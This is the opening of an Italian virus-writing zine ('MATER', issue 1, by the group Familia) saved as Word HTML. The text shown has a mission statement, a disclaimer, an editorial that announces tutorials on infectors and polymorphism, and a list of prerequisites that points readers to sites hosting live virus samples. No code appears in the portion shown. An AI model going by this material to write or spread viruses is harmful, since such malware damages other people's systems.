<html xmlns:v="urn:schemas-microsoft-com:vml"
xmlns:o="urn:schemas-microsoft-com:office:office"
xmlns:w="urn:schemas-microsoft-com:office:word"
xmlns="http://www.w3.org/TR/REC-html40">

<head>
<meta http-equiv=Content-Type content="text/html; charset=windows-1252">
<meta name=ProgId content=Word.Document>
<meta name=Generator content="Microsoft Word 9">
<meta name=Originator content="Microsoft Word 9">
<link rel=File-List href="./MATER_1_file/filelist.xml">
<title>MATER_1</title>
<!--[if gte mso 9]><xml>
 <o:DocumentProperties>
  <o:Subject>zine</o:Subject>
  <o:Author>Familia</o:Author>
  <o:LastAuthor>Administrator</o:LastAuthor>
  <o:Revision>4</o:Revision>
  <o:TotalTime>138</o:TotalTime>
  <o:LastPrinted>2000-11-23T14:26:00Z</o:LastPrinted>
  <o:Created>2000-12-04T10:28:00Z</o:Created>
  <o:LastSaved>2000-12-04T10:35:00Z</o:LastSaved>
  <o:Pages>5</o:Pages>
  <o:Words>8226</o:Words>
  <o:Characters>46889</o:Characters>
  <o:Manager>tutti</o:Manager>
  <o:Company>globale</o:Company>
  <o:Lines>390</o:Lines>
  <o:Paragraphs>93</o:Paragraphs>
  <o:CharactersWithSpaces>57582</o:CharactersWithSpaces>
  <o:Version>9.2812</o:Version>
 </o:DocumentProperties>
</xml><![endif]--><!--[if gte mso 9]><xml>
 <w:WordDocument>
  <w:ActiveWritingStyle Lang="IT" VendorID="3" DLLVersion="517" NLCheck="0">1</w:ActiveWritingStyle>
  <w:HyphenationZone>14</w:HyphenationZone>
  <w:DrawingGridHorizontalSpacing>6 pt</w:DrawingGridHorizontalSpacing>
  <w:DisplayHorizontalDrawingGridEvery>2</w:DisplayHorizontalDrawingGridEvery>
  <w:DisplayVerticalDrawingGridEvery>2</w:DisplayVerticalDrawingGridEvery>
  <w:Compatibility>
   <w:FootnoteLayoutLikeWW8/>
   <w:ShapeLayoutLikeWW8/>
   <w:AlignTablesRowByRow/>
   <w:ForgetLastTabAlignment/>
   <w:LayoutRawTableWidth/>
   <w:LayoutTableRowsApart/>
  </w:Compatibility>
 </w:WordDocument>
</xml><![endif]-->
<style>
<!--
 /* Font Definitions */
@font-face
	{font-family:Wingdings;
	panose-1:5 0 0 0 0 0 0 0 0 0;
	mso-font-charset:2;
	mso-generic-font-family:auto;
	mso-font-pitch:variable;
	mso-font-signature:0 268435456 0 0 -2147483648 0;}
@font-face
	{font-family:"MS Mincho";
	panose-1:2 2 6 9 4 2 5 8 3 4;
	mso-font-alt:"\FF2D\FF33 \660E\671D";
	mso-font-charset:128;
	mso-generic-font-family:roman;
	mso-font-pitch:fixed;
	mso-font-signature:-1610612033 1757936891 16 0 131231 0;}
@font-face
	{font-family:Albertus;
	panose-1:0 0 0 0 0 0 0 0 0 0;
	mso-font-charset:0;
	mso-generic-font-family:swiss;
	mso-font-format:other;
	mso-font-pitch:variable;
	mso-font-signature:3 0 0 0 1 0;}
@font-face
	{font-family:"Arial Unicode MS";
	panose-1:2 11 6 4 2 2 2 2 2 4;
	mso-font-charset:128;
	mso-generic-font-family:modern;
	mso-font-pitch:variable;
	mso-font-signature:-1 -369098753 63 0 4129023 0;}
@font-face
	{font-family:"\@MS Mincho";
	mso-font-charset:128;
	mso-generic-font-family:roman;
	mso-font-pitch:fixed;
	mso-font-signature:-1610612033 1757936891 16 0 131231 0;}
@font-face
	{font-family:"\@Arial Unicode MS";
	mso-font-charset:128;
	mso-generic-font-family:modern;
	mso-font-pitch:variable;
	mso-font-signature:-1 -369098753 63 0 4129023 0;}
 /* Style Definitions */
p.MsoNormal, li.MsoNormal, div.MsoNormal
	{mso-style-parent:"";
	margin:0cm;
	margin-bottom:.0001pt;
	mso-pagination:widow-orphan;
	font-size:12.0pt;
	font-family:"Times New Roman";
	mso-fareast-font-family:"Times New Roman";}
h1
	{margin-right:0cm;
	mso-margin-top-alt:auto;
	mso-margin-bottom-alt:auto;
	margin-left:0cm;
	mso-pagination:widow-orphan;
	mso-outline-level:1;
	font-size:24.0pt;
	font-family:"Times New Roman";
	mso-fareast-font-family:"Times New Roman";
	mso-font-kerning:18.0pt;
	font-weight:bold;}
h2
	{mso-style-next:Normale;
	margin-top:0cm;
	margin-right:0cm;
	margin-bottom:0cm;
	margin-left:18.0pt;
	margin-bottom:.0001pt;
	mso-pagination:widow-orphan;
	mso-outline-level:2;
	font-size:12.0pt;
	font-family:"Times New Roman";
	mso-fareast-font-family:"MS Mincho";
	color:white;
	font-weight:bold;}
h3
	{mso-style-next:Normale;
	margin-top:0cm;
	margin-right:0cm;
	margin-bottom:0cm;
	margin-left:18.0pt;
	margin-bottom:.0001pt;
	text-align:center;
	mso-pagination:widow-orphan;
	page-break-after:avoid;
	mso-outline-level:3;
	font-size:12.0pt;
	font-family:"Times New Roman";
	mso-fareast-font-family:"MS Mincho";
	color:white;
	font-weight:bold;}
h4
	{margin-right:0cm;
	mso-margin-top-alt:auto;
	mso-margin-bottom-alt:auto;
	margin-left:0cm;
	mso-pagination:widow-orphan;
	mso-outline-level:4;
	font-size:12.0pt;
	font-family:"Arial Unicode MS";
	font-weight:bold;}
h5
	{mso-style-next:Normale;
	margin:0cm;
	margin-bottom:.0001pt;
	text-align:center;
	mso-pagination:widow-orphan;
	page-break-after:avoid;
	mso-outline-level:5;
	font-size:14.0pt;
	mso-bidi-font-size:12.0pt;
	font-family:Arial;
	mso-fareast-font-family:"Times New Roman";
	color:white;
	font-weight:bold;}
h6
	{mso-style-next:Normale;
	margin:0cm;
	margin-bottom:.0001pt;
	text-align:center;
	mso-pagination:widow-orphan;
	page-break-after:avoid;
	mso-outline-level:6;
	font-size:12.0pt;
	font-family:"Times New Roman";
	mso-fareast-font-family:"Times New Roman";
	color:#CCFFFF;
	font-weight:normal;
	font-style:italic;}
p.MsoHeading7, li.MsoHeading7, div.MsoHeading7
	{mso-style-next:Normale;
	margin:0cm;
	margin-bottom:.0001pt;
	text-align:justify;
	mso-pagination:widow-orphan;
	page-break-after:avoid;
	mso-outline-level:7;
	font-size:12.0pt;
	font-family:"Times New Roman";
	mso-fareast-font-family:"Times New Roman";
	color:#CCFFFF;
	font-style:italic;}
p.MsoHeading8, li.MsoHeading8, div.MsoHeading8
	{mso-style-next:Normale;
	margin:0cm;
	margin-bottom:.0001pt;
	text-align:center;
	mso-pagination:widow-orphan;
	page-break-after:avoid;
	mso-outline-level:8;
	font-size:18.0pt;
	mso-bidi-font-size:12.0pt;
	font-family:"Times New Roman";
	mso-fareast-font-family:"Times New Roman";
	color:#CCFFFF;}
p.MsoToc1, li.MsoToc1, div.MsoToc1
	{mso-style-update:auto;
	mso-style-next:Normale;
	margin:0cm;
	margin-bottom:.0001pt;
	mso-pagination:widow-orphan;
	font-size:12.0pt;
	font-family:"Times New Roman";
	mso-fareast-font-family:"Times New Roman";}
p.MsoToc2, li.MsoToc2, div.MsoToc2
	{mso-style-update:auto;
	mso-style-next:Normale;
	margin-top:0cm;
	margin-right:0cm;
	margin-bottom:0cm;
	margin-left:12.0pt;
	margin-bottom:.0001pt;
	mso-pagination:widow-orphan;
	font-size:12.0pt;
	font-family:"Times New Roman";
	mso-fareast-font-family:"Times New Roman";}
p.MsoToc3, li.MsoToc3, div.MsoToc3
	{mso-style-update:auto;
	mso-style-next:Normale;
	margin-top:0cm;
	margin-right:0cm;
	margin-bottom:0cm;
	margin-left:24.0pt;
	margin-bottom:.0001pt;
	mso-pagination:widow-orphan;
	font-size:12.0pt;
	font-family:"Times New Roman";
	mso-fareast-font-family:"Times New Roman";}
p.MsoToc4, li.MsoToc4, div.MsoToc4
	{mso-style-update:auto;
	mso-style-next:Normale;
	margin-top:0cm;
	margin-right:0cm;
	margin-bottom:0cm;
	margin-left:36.0pt;
	margin-bottom:.0001pt;
	mso-pagination:widow-orphan;
	font-size:12.0pt;
	font-family:"Times New Roman";
	mso-fareast-font-family:"Times New Roman";}
p.MsoToc5, li.MsoToc5, div.MsoToc5
	{mso-style-update:auto;
	mso-style-next:Normale;
	margin-top:0cm;
	margin-right:0cm;
	margin-bottom:0cm;
	margin-left:48.0pt;
	margin-bottom:.0001pt;
	mso-pagination:widow-orphan;
	font-size:12.0pt;
	font-family:"Times New Roman";
	mso-fareast-font-family:"Times New Roman";}
p.MsoToc6, li.MsoToc6, div.MsoToc6
	{mso-style-update:auto;
	mso-style-next:Normale;
	margin-top:0cm;
	margin-right:0cm;
	margin-bottom:0cm;
	margin-left:60.0pt;
	margin-bottom:.0001pt;
	mso-pagination:widow-orphan;
	font-size:12.0pt;
	font-family:"Times New Roman";
	mso-fareast-font-family:"Times New Roman";}
p.MsoToc7, li.MsoToc7, div.MsoToc7
	{mso-style-update:auto;
	mso-style-next:Normale;
	margin-top:0cm;
	margin-right:0cm;
	margin-bottom:0cm;
	margin-left:72.0pt;
	margin-bottom:.0001pt;
	mso-pagination:widow-orphan;
	font-size:12.0pt;
	font-family:"Times New Roman";
	mso-fareast-font-family:"Times New Roman";}
p.MsoToc8, li.MsoToc8, div.MsoToc8
	{mso-style-update:auto;
	mso-style-next:Normale;
	margin-top:0cm;
	margin-right:0cm;
	margin-bottom:0cm;
	margin-left:84.0pt;
	margin-bottom:.0001pt;
	mso-pagination:widow-orphan;
	font-size:12.0pt;
	font-family:"Times New Roman";
	mso-fareast-font-family:"Times New Roman";}
p.MsoToc9, li.MsoToc9, div.MsoToc9
	{mso-style-update:auto;
	mso-style-next:Normale;
	margin-top:0cm;
	margin-right:0cm;
	margin-bottom:0cm;
	margin-left:96.0pt;
	margin-bottom:.0001pt;
	mso-pagination:widow-orphan;
	font-size:12.0pt;
	font-family:"Times New Roman";
	mso-fareast-font-family:"Times New Roman";}
p.MsoFooter, li.MsoFooter, div.MsoFooter
	{margin:0cm;
	margin-bottom:.0001pt;
	mso-pagination:widow-orphan;
	tab-stops:center 240.95pt right 481.9pt;
	font-size:12.0pt;
	font-family:"Times New Roman";
	mso-fareast-font-family:"Times New Roman";}
p.MsoTof, li.MsoTof, div.MsoTof
	{mso-style-next:Normale;
	margin-top:0cm;
	margin-right:0cm;
	margin-bottom:0cm;
	margin-left:24.0pt;
	margin-bottom:.0001pt;
	text-indent:-24.0pt;
	mso-pagination:widow-orphan;
	font-size:12.0pt;
	font-family:"Times New Roman";
	mso-fareast-font-family:"Times New Roman";}
p.MsoBodyText, li.MsoBodyText, div.MsoBodyText
	{margin:0cm;
	margin-bottom:.0001pt;
	text-align:justify;
	mso-pagination:widow-orphan;
	font-size:12.0pt;
	font-family:"Times New Roman";
	mso-fareast-font-family:"Times New Roman";}
p.MsoBodyTextIndent, li.MsoBodyTextIndent, div.MsoBodyTextIndent
	{margin-top:0cm;
	margin-right:0cm;
	margin-bottom:0cm;
	margin-left:18.0pt;
	margin-bottom:.0001pt;
	mso-pagination:widow-orphan;
	font-size:14.0pt;
	mso-bidi-font-size:12.0pt;
	font-family:Arial;
	mso-fareast-font-family:"MS Mincho";
	color:yellow;
	font-weight:bold;}
p.MsoBodyTextIndent2, li.MsoBodyTextIndent2, div.MsoBodyTextIndent2
	{margin-top:0cm;
	margin-right:0cm;
	margin-bottom:0cm;
	margin-left:18.0pt;
	margin-bottom:.0001pt;
	mso-pagination:widow-orphan;
	font-size:14.0pt;
	mso-bidi-font-size:12.0pt;
	font-family:Arial;
	mso-fareast-font-family:"MS Mincho";
	color:#FFCC00;
	font-weight:bold;}
a:link, span.MsoHyperlink
	{color:blue;
	text-decoration:underline;
	text-underline:single;}
a:visited, span.MsoHyperlinkFollowed
	{color:purple;
	text-decoration:underline;
	text-underline:single;}
p.MsoPlainText, li.MsoPlainText, div.MsoPlainText
	{margin:0cm;
	margin-bottom:.0001pt;
	mso-pagination:widow-orphan;
	font-size:10.0pt;
	font-family:"Courier New";
	mso-fareast-font-family:"Times New Roman";}
p
	{margin-right:0cm;
	mso-margin-top-alt:auto;
	mso-margin-bottom-alt:auto;
	margin-left:0cm;
	mso-pagination:widow-orphan;
	font-size:12.0pt;
	font-family:"Arial Unicode MS";}
pre
	{margin:0cm;
	margin-bottom:.0001pt;
	mso-pagination:widow-orphan;
	tab-stops:45.8pt 91.6pt 137.4pt 183.2pt 229.0pt 274.8pt 320.6pt 366.4pt 412.2pt 458.0pt 503.8pt 549.6pt 595.4pt 641.2pt 687.0pt 732.8pt;
	font-size:10.0pt;
	font-family:"Courier New";
	mso-fareast-font-family:"Courier New";}
@page Section1
	{size:595.3pt 841.9pt;
	margin:70.85pt 2.0cm 2.0cm 2.0cm;
	mso-header-margin:35.4pt;
	mso-footer-margin:35.4pt;
	mso-paper-source:0;}
div.Section1
	{page:Section1;}
 /* List Definitions */
@list l0
	{mso-list-id:91707824;
	mso-list-type:hybrid;
	mso-list-template-ids:-241390948 -1158754622 -2001031696 1944343528 1055975584 -382540448 1434729718 417377816 1786933648 326642326;}
@list l1
	{mso-list-id:436215031;
	mso-list-type:hybrid;
	mso-list-template-ids:-730985502 68157455 68157465 68157467 68157455 68157465 68157467 68157455 68157465 68157467;}
@list l2
	{mso-list-id:702483378;
	mso-list-type:hybrid;
	mso-list-template-ids:-1119346224 68157455 68157465 68157467 68157455 68157465 68157467 68157455 68157465 68157467;}
@list l3
	{mso-list-id:1132216254;
	mso-list-type:hybrid;
	mso-list-template-ids:727893032 68157455 68157465 68157467 68157455 68157465 68157467 68157455 68157465 68157467;}
@list l4
	{mso-list-id:1311863962;
	mso-list-type:hybrid;
	mso-list-template-ids:621830610 68157455 68157465 68157467 68157455 68157465 68157467 68157455 68157465 68157467;}
@list l5
	{mso-list-id:1582835795;
	mso-list-type:hybrid;
	mso-list-template-ids:-2147031668 68157455 68157465 68157467 68157455 68157465 68157467 68157455 68157465 68157467;}
@list l6
	{mso-list-id:1775009674;
	mso-list-type:hybrid;
	mso-list-template-ids:1362108880 68157455 68157465 68157467 68157455 68157465 68157467 68157455 68157465 68157467;}
@list l7
	{mso-list-id:1977561699;
	mso-list-type:hybrid;
	mso-list-template-ids:1724036784 68157455 68157465 68157467 68157455 68157465 68157467 68157455 68157465 68157467;}
ol
	{margin-bottom:0cm;}
ul
	{margin-bottom:0cm;}
-->
</style>
<!--[if gte mso 9]><xml>
 <o:shapedefaults v:ext="edit" spidmax="1027">
  <o:colormru v:ext="edit" colors="#039,#000082,#04047e,#050597,#05058b,#000078"/>
  <o:colormenu v:ext="edit" fillcolor="#000078"/>
 </o:shapedefaults></xml><![endif]--><!--[if gte mso 9]><xml>
 <o:shapelayout v:ext="edit">
  <o:idmap v:ext="edit" data="1"/>
 </o:shapelayout></xml><![endif]-->
</head>

<body bgcolor="#000078" lang=IT link=blue vlink=purple style='tab-interval:
35.4pt'>

<div class=Section1>

<p class=MsoPlainText align=center style='text-align:center'><b><span
style='font-size:36.0pt;mso-bidi-font-size:10.0pt;font-family:"Times New Roman";
mso-fareast-font-family:"MS Mincho";mso-bidi-font-family:"Courier New";
color:red'>M</span></b><b><span style='font-size:36.0pt;mso-bidi-font-size:
10.0pt;font-family:"Times New Roman";mso-fareast-font-family:"MS Mincho";
mso-bidi-font-family:"Courier New";color:#CCFFFF'>inima </span></b><b><span
style='font-size:36.0pt;mso-bidi-font-size:10.0pt;font-family:"Times New Roman";
mso-fareast-font-family:"MS Mincho";mso-bidi-font-family:"Courier New";
color:red'>A</span></b><b><span style='font-size:36.0pt;mso-bidi-font-size:
10.0pt;font-family:"Times New Roman";mso-fareast-font-family:"MS Mincho";
mso-bidi-font-family:"Courier New";color:#CCFFFF'>nonyma </span></b><b><span
style='font-size:36.0pt;mso-bidi-font-size:10.0pt;font-family:"Times New Roman";
mso-fareast-font-family:"MS Mincho";mso-bidi-font-family:"Courier New";
color:red'>T</span></b><b><span style='font-size:36.0pt;mso-bidi-font-size:
10.0pt;font-family:"Times New Roman";mso-fareast-font-family:"MS Mincho";
mso-bidi-font-family:"Courier New";color:#CCFFFF'>abularia </span></b><b><span
style='font-size:36.0pt;mso-bidi-font-size:10.0pt;font-family:"Times New Roman";
mso-fareast-font-family:"MS Mincho";mso-bidi-font-family:"Courier New";
color:red'>E</span></b><b><span style='font-size:36.0pt;mso-bidi-font-size:
10.0pt;font-family:"Times New Roman";mso-fareast-font-family:"MS Mincho";
mso-bidi-font-family:"Courier New";color:#CCFFFF'>x </span></b><b><span
style='font-size:36.0pt;mso-bidi-font-size:10.0pt;font-family:"Times New Roman";
mso-fareast-font-family:"MS Mincho";mso-bidi-font-family:"Courier New";
color:red'>R</span></b><b><span style='font-size:36.0pt;mso-bidi-font-size:
10.0pt;font-family:"Times New Roman";mso-fareast-font-family:"MS Mincho";
mso-bidi-font-family:"Courier New";color:#CCFFFF'>eti<o:p></o:p></span></b></p>

<p class=MsoNormal align=center style='margin-left:18.0pt;text-align:center'><i><span
style='font-size:11.0pt;mso-bidi-font-size:12.0pt;mso-fareast-font-family:"MS Mincho";
color:#99CCFF'>nihil vacuum neque sine signo apud </span></i><i><span
style='font-size:11.0pt;mso-bidi-font-size:12.0pt;mso-fareast-font-family:"MS Mincho";
color:#CCFFCC'>MATER</span></i><i><span style='font-size:11.0pt;mso-bidi-font-size:
12.0pt;mso-fareast-font-family:"MS Mincho";color:#99CCFF'><o:p></o:p></span></i></p>

<h3><a name="_Ref500557024">Liber Primus</a></h3>

<p class=MsoNormal align=center style='margin-left:18.0pt;text-align:center'><i><span
style='mso-fareast-font-family:"MS Mincho";color:white'><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></span></i></p>

<p class=MsoNormal align=center style='margin-left:18.0pt;text-align:center'><i><span
style='mso-fareast-font-family:"MS Mincho";color:white'><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></span></i></p>

<h2 style='text-align:justify'><span style='font-family:Arial;font-weight:normal'>Salve,
vera Neumannis proles. <o:p></o:p></span></h2>

<h2 style='text-align:justify'><span style='font-family:Arial;font-weight:normal'>Questa
è la zine ufficiale di Familia, un gruppo che ha come oggetto di studio la
programmazione virale.<o:p></o:p></span></h2>

<h2 style='text-align:justify'><span style='font-family:Arial;font-weight:normal'>MATER
ha come scopo l’esame delle tecniche di programmazione virale e delle
problematiche ad esse associate. MATER è una raccolta di contributi volontari
(e non) di alcuni code-writers del pianeta, in lingua italiana ed è rivolta
soprattutto a chi si avvicina per la prima volta al mondo dei virus e necessita
dei concetti di base che spesso sono dati per scontati nelle zines reperibili
in Rete. Non è, tuttavia, una esemplificazione discorsiva priva di contenuto
tecnico: per comprendere gli esempi ivi contenuti è necessaria una minima
conoscenza dell’architettura di un elaboratore e del linguaggio assembler.<o:p></o:p></span></h2>

<p class=MsoNormal><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></p>

<h2 style='text-align:justify'><span style='font-family:Arial;font-weight:normal'>E’
nostra convinzione che una migliore conoscenza delle metodologie infettive
digitali sia la principale strada per accrescere la sicurezza degli utenti e
fornire un contributo a chi opera nel settore della programmazione. Ritenendo
il vero nemico della sicurezza la disinformazione, auspichiamo che una più
profonda comprensione in questo campo dissipi i dubbi, aiuti la ricerca e
contribuisca al progresso dell’educazione informatica. Sursum Corda !<span
style="mso-spacerun: yes">  </span><o:p></o:p></span></h2>

<h2 style='text-align:justify'><span style='font-family:Arial;font-weight:normal'>Ictus/Familia<o:p></o:p></span></h2>

<p class=MsoNormal><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></p>

<p class=MsoNormal><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></p>

<h5><span style='font-size:16.0pt;mso-bidi-font-size:12.0pt'>ATTENZIONE<o:p></o:p></span></h5>

<p class=MsoNormal style='margin-left:18.0pt;text-align:justify'><span
style='font-family:Arial;color:white'>Questa pubblicazione contiene
informazioni e codice sorgente relativi alla sicurezza informatica. </span><span
style='font-family:Arial;mso-fareast-font-family:"MS Mincho";color:white'>L’obbiettivo
di queste informazioni è di aiutare gli utenti ad accrescere la propria capacità
di programmazione. Questo materiale è a puro scopo didattico e non include
codice distruttivo né documenti attinenti ad alcuna attività illegale. Si
declina ogni responsabilità nel caso chiunque utilizzi le suddette informazioni
per creare, compilare e diffondere intenzionalmente programmi diretti a
danneggiare o interrompere un sistema informatico o telematico, ovvero a
provocarne l'interruzione, totale o parziale, o l'alterazione del suo
funzionamento <i>Art. 615-quinquies (Legge n. 547/93 pubblicata in Gazzetta
Ufficiale n. 305 del 30.12.1993)</i></span><span style='font-family:Arial'><o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify'><span style='font-family:Arial'><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify'><span style='font-family:Arial'><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify'><span style='font-family:Arial'><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></span></p>

<p class=MsoHeading7>EDITORIALE</p>

<p class=MsoNormal style='text-align:justify'><i><span style='color:#CCFFFF'><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></span></i></p>

<p class=MsoNormal style='text-align:justify'><i><span style='color:#CCFFFF'>Qualcuno
di voi, cari bambini, si chiederà perché un’altra zine sui virus. Di risposte
se ne potrebbero dare tante, forse di valida nessuna. Proverò a darne una
manciata decente. Primo, perché MATER è in lingua italiana. E chi inizia da
zero o quasi e non ha dimestichezza con la lingua della Rete sa quanto sia
arduo a volte districarsi nello slang viroide. Secondo, MATER è semplice. Essa
non è rivolta ai bravissimi né ai Vwriters affermati, ma non può essere letta
nemmeno da chi è totalmente digiuno di programmazione assembler. In breve, è la
zine della scuola elementare dei virus, potremmo chiamarla “Virus for Dummies”.
Terzo, perché è di tutti e di nessuno. In MATER troverete pezzi di tutorial di
Billy Belcebu, spezzoni di articoli di Lord Julius e di GriYo, riferimenti a
Darkman e Super29A… insomma, una minestrina propedeutica, un omogeneizzato
didattico facilmente assimilabile per i bimbi affamati di sapere.<o:p></o:p></span></i></p>

<p class=MsoNormal style='text-align:justify'><i><span style='color:#CCFFFF'>Che
altro ? MATER è aperiodica, ma già fin d’ora possiamo fornirvi un’idea del
contenuto dei prossimi numeri. Si parlerà di EXE infettori sotto DOS, quindi si
passerà all’ambiente Windows a 32 bit, e da lì andremo alla scoperta di questo
nuovo mondo, della crittografia, del polimorfismo e via verso le stelle…<o:p></o:p></span></i></p>

<p class=MsoNormal style='text-align:justify'><i><span style='color:#CCFFFF'>Può
darsi che i principianti a questo punto, vedendo l’indice di questo numero,
storcano il naso: “ma come”, diranno, “Con Windows32 ormai come sistema
universale, ci mettiamo a studiare i virus sotto DOS ?” cari bambini, abbiate
pazienza. Per apprendere le tecniche infettive sotto Windows è necessario prima
avere un’idea delle medesime sotto DOS, più semplice e lineare. Inoltre alcune
tecniche di base (ad esempio la ricerca del delta offset, la crittografia, il
polimorfismo) sono le stesse sia sotto DOS che sotto Windows. Quindi…<span
style="mso-spacerun: yes">                                                 
</span>Milla/Familia<span style="mso-spacerun: yes">        </span><o:p></o:p></span></i></p>

<p class=MsoPlainText><span style='mso-fareast-font-family:"MS Mincho";
color:#CCFFFF'><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></span></p>

<p class=MsoPlainText><span style='font-size:12.0pt;mso-bidi-font-size:10.0pt;
font-family:"Times New Roman";mso-fareast-font-family:"MS Mincho";color:#CCFFFF'><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></span></p>

<p class=MsoPlainText><span style='font-size:12.0pt;mso-bidi-font-size:10.0pt;
font-family:"Times New Roman";mso-fareast-font-family:"MS Mincho";color:#CCFFFF'>Ciò
di cui avrete bisogno:<o:p></o:p></span></p>

<p class=MsoPlainText><span style='font-size:12.0pt;mso-bidi-font-size:10.0pt;
font-family:"Times New Roman";mso-fareast-font-family:"MS Mincho";color:#CCFFFF'><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></span></p>

<p class=MsoPlainText><span style='font-size:12.0pt;mso-bidi-font-size:10.0pt;
font-family:"Times New Roman";mso-fareast-font-family:"MS Mincho";color:#FFCC99'>per
iniziare, se siete proprio digiuni di assembler:<o:p></o:p></span></p>

<p class=MsoPlainText><span style='font-size:12.0pt;mso-bidi-font-size:10.0pt;
font-family:"Times New Roman";mso-fareast-font-family:"MS Mincho";color:#CCFFFF'>Il
libro “Art of assembly language”, scaricabile dal sito: </span><span
style='mso-fareast-font-family:"MS Mincho";color:#CCFFFF'><a
href="http://webster.cs.ucr.edu/">http://webster.cs.ucr.edu/</a></span><span
style='font-size:12.0pt;mso-bidi-font-size:10.0pt;font-family:"Times New Roman";
mso-fareast-font-family:"MS Mincho";color:#CCFFFF'>;<o:p></o:p></span></p>

<p class=MsoPlainText><span style='font-size:12.0pt;mso-bidi-font-size:10.0pt;
font-family:"Times New Roman";mso-fareast-font-family:"MS Mincho";color:#CCFFFF'>Qualche
tutorial sull’assembler (date un’occhiata da Iczelion: </span><span
style='mso-fareast-font-family:"MS Mincho";color:#CCFFFF'><a
href="http://members.nbci.com/_XMCM/winasm/index.html">http://members.nbci.com/_XMCM/winasm/index.html</a></span><span
style='font-size:12.0pt;mso-bidi-font-size:10.0pt;font-family:"Times New Roman";
mso-fareast-font-family:"MS Mincho";color:#CCFFFF'>);<o:p></o:p></span></p>

<p class=MsoPlainText><span style='font-size:12.0pt;mso-bidi-font-size:10.0pt;
font-family:"Times New Roman";mso-fareast-font-family:"MS Mincho";color:#CCFFFF'>I
manuali dell’Intel (</span><span style='mso-fareast-font-family:"MS Mincho";
color:#CCFFFF'><a href="http://developer.intel.com/design/PentiumII/manuals/">http://developer.intel.com/design/PentiumII/manuals/</a></span><span
style='font-size:12.0pt;mso-bidi-font-size:10.0pt;font-family:"Times New Roman";
mso-fareast-font-family:"MS Mincho";color:#CCFFFF'>), soprattutto il vol. II;<o:p></o:p></span></p>

<p class=MsoPlainText><span style='font-size:12.0pt;mso-bidi-font-size:10.0pt;
font-family:"Times New Roman";mso-fareast-font-family:"MS Mincho";color:#CCFFFF'><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></span></p>

<p class=MsoPlainText><span style='font-size:12.0pt;mso-bidi-font-size:10.0pt;
font-family:"Times New Roman";mso-fareast-font-family:"MS Mincho";color:#FFCC99'>Per
la programmazione in ambiente DOS:</span><span style='font-size:12.0pt;
mso-bidi-font-size:10.0pt;font-family:"Times New Roman";mso-fareast-font-family:
"MS Mincho";color:#CCFFFF'><o:p></o:p></span></p>

<p class=MsoPlainText><span style='font-size:12.0pt;mso-bidi-font-size:10.0pt;
font-family:"Times New Roman";mso-fareast-font-family:"MS Mincho";color:#CCFFFF'>Un
PC con DOS;<o:p></o:p></span></p>

<p class=MsoPlainText><span style='font-size:12.0pt;mso-bidi-font-size:10.0pt;
font-family:"Times New Roman";mso-fareast-font-family:"MS Mincho";color:#CCFFFF'>La
Ralf Brown’s Interrupt list (si trova ovunque);<o:p></o:p></span></p>

<p class=MsoPlainText><span style='font-size:12.0pt;mso-bidi-font-size:10.0pt;
font-family:"Times New Roman";mso-fareast-font-family:"MS Mincho";color:#CCFFFF'>Un
visualizzatore esadecimale (si trova ovunque);<o:p></o:p></span></p>

<p class=MsoPlainText><span style='font-size:12.0pt;mso-bidi-font-size:10.0pt;
font-family:"Times New Roman";mso-fareast-font-family:"MS Mincho";color:#CCFFFF'>Un
assemblatore (si consiglia il pacchetto TASM 5.0 che include TASM32 e TLINK32);<o:p></o:p></span></p>

<p class=MsoPlainText><span style='font-size:12.0pt;mso-bidi-font-size:10.0pt;
font-family:"Times New Roman";mso-fareast-font-family:"MS Mincho";color:#CCFFFF'>Qualche
virus per DOS (se ne trovano migliaia, provate un po’ da http://vx.netlux.org/
o da </span><span style='mso-fareast-font-family:"MS Mincho";color:#CCFFFF'><a
href="http://www.coderz.net/">www.coderz.net</a></span><span style='font-size:
12.0pt;mso-bidi-font-size:10.0pt;font-family:"Times New Roman";mso-fareast-font-family:
"MS Mincho";color:#CCFFFF'>);<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;mso-layout-grid-align:none;
text-autospace:none'><span style='mso-bidi-font-size:24.0pt;color:#CCFFFF'>The
Little Black Book of Computer Viruses di </span><span style='mso-bidi-font-size:
13.0pt;color:#CCFFFF'>Mark A. Ludwig (si trova da </span><span lang=EN-US
style='mso-bidi-font-size:13.0pt;color:#CCFFFF;mso-ansi-language:EN-US'><a
href="http://vx.netlux.org/"><span lang=IT style='mso-ansi-language:IT'>http://vx.netlux.org/</span></a></span><span
style='mso-bidi-font-size:13.0pt;color:#CCFFFF'> o da coderz).<o:p></o:p></span></p>

<p class=MsoPlainText><span style='font-size:12.0pt;mso-bidi-font-size:10.0pt;
font-family:"Times New Roman";mso-fareast-font-family:"MS Mincho";color:#CCFFFF'>Un
AV per DOS.<o:p></o:p></span></p>

<p class=MsoPlainText><span style='font-size:12.0pt;mso-bidi-font-size:10.0pt;
font-family:"Times New Roman";mso-fareast-font-family:"MS Mincho";color:#CCFFFF'><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></span></p>

<p class=MsoPlainText><span style='font-size:12.0pt;mso-bidi-font-size:10.0pt;
font-family:"Times New Roman";mso-fareast-font-family:"MS Mincho";color:#FFCC99'>Per
la programmazione in ambiente Win32:<o:p></o:p></span></p>

<p class=MsoPlainText><span lang=EN-US style='font-size:12.0pt;mso-bidi-font-size:
10.0pt;font-family:"Times New Roman";mso-fareast-font-family:"MS Mincho";
color:#CCFFFF;mso-ansi-language:EN-US'>Un PC con Windows 95 o Windows NT o
Windows 98 o Windows 3.x + Win32s;<o:p></o:p></span></p>

<p class=MsoPlainText><span style='font-size:12.0pt;mso-bidi-font-size:10.0pt;
font-family:"Times New Roman";mso-fareast-font-family:"MS Mincho";color:#CCFFFF'>Un
